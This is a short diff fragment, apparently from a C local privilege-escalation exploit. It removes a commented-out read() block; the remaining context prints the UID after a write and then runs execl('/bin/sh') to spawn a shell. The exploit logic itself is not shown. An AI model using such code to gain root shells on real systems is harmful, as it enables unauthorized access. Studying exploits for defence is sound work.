@@ -664,12 +664,6 @@ _start:
     assert(write_ret > 0);
 
     printf("UID after: %d \n", getuid());
-    /*
-    char buffer[4096];
-    int read_ret = read(fd, buffer, sizeof(buffer));
-    perror("read()");
-    assert(read_ret > 0);
-    */
     execl("/bin/sh", "/bin/sh", 0);
 
     return 0;
